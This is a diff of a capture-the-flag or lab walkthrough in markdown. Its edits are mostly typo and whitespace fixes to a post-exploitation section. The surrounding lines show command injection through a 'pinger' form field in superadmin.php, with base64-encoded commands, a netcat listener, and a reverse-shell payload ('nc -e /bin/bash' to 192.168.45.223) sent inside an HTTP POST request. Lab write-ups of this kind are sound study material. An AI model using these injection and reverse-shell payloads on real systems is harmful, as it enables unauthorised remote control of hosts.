@@ -192,7 +192,7 @@ Content-Type: text/html; charset=UTF-8
 # post exploitation
 ## reverse shell
 
-Playing around with reverse shell payloads shows that some kind of filter seems to be active. Lets review the `php` code of `superadmin.php`
+Playing around with reverse shell payloads shows that some kind of filter seems to be active. Lets review the `php` code of `superadmin.php`  
 payload: `cat superadmin.php`
 ```http
 POST /superadmin.php HTTP/1.1
@@ -255,7 +255,7 @@ $ echo "pwd" |base64
 cHdkCg==
 ```
 
-The we construct the following payload
+Then we construct the following payload
 ```bash
 |`echo "cHdkCg==" |base64 -d`
 ```
@@ -307,8 +307,8 @@ $ nc -lvp 80
 listening on [any] 80 ...
 ```
 
-Inject reverse shell payload
-netcat payload: `nc -e /bin/bash 192.168.45.223 80`   
+Inject reverse shell payload  
+netcat payload: `nc -e /bin/bash 192.168.45.223 80`  
 encoded payload: `|echo "bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDUuMjIzIDgwCg==" |base64 -d`
 ```http
 POST /superadmin.php HTTP/1.1
@@ -328,10 +328,10 @@ Connection: close
 pinger=127|`echo%20%22bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDUuMjIzIDgwCg==%22%20|base64%20-d`&submitt=Submit
 ```
 
-> Unfortunately we do not get a connect. Maybe `nc` is not available.
+> Unfortunately we do not get a connection. Maybe `nc` is not available.
 {: .prompt-danger }
 
-payload: `ls -lsah /bin`
+payload: `ls -lsah /bin`  
 Lets inspect which binaries are available on the target system.
 ```http
 POST /superadmin.php HTTP/1.1
